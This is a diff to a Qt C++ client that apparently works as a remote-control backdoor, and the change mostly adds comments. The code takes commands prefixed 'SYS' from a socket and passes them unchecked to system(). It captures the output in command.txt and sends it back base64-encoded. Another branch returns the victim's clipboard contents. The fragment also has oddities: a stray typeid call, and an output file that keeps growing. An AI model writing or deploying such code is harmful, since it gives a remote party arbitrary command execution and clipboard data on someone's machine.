@@ -33,18 +33,17 @@ void MainWindow::read(){
   {
           MainWindow::sendCmd(this->clippy->getclipboardString());
 }
-  else if(returnStr.contains("SYS"))
+  else if(returnStr.contains("SYS")) //SYS commands are here to receive command to pass to system and give back the return
   {
       returnStr.remove(0,4);
       system(qPrintable(returnStr + ">> command.txt"));
-      qDebug() << returnStr;
       QFile *file = new QFile("command.txt");
       if(!file->open(QIODevice::ReadWrite))
       {
           qWarning("Couldn't save the file");
       }
       QTextStream in(file);
-      QString output = in.readAll();
+      QString output = in.readAll(); //have to read from a file, since system just returns 0 or exit message that are integers
       typeid("typeid is" + returnStr);
       MainWindow::sendCmd(output);
 
@@ -52,7 +51,7 @@ void MainWindow::read(){
 
   this->networdHandler = NIL;
 }
-void MainWindow::sendCmd(QString cmd){
+void MainWindow::sendCmd(QString cmd){ //taken from the server part, just gives back the answer here
   this->clientSocket->write((cmd + "\n").toUtf8().toBase64());
   this->clientSocket->flush();
 }
